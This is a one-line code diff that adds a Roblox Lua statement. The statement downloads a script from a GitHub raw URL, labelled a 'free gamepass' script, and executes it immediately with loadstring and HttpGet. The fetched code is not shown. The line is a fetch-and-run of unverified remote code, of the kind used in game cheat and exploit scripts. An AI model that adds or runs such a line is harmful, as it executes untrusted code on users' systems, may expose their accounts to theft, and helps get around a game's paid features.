@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/giobolqv1/free-gamepass-by-GioBolqv1-/refs/heads/main/gamepass.lua"))()
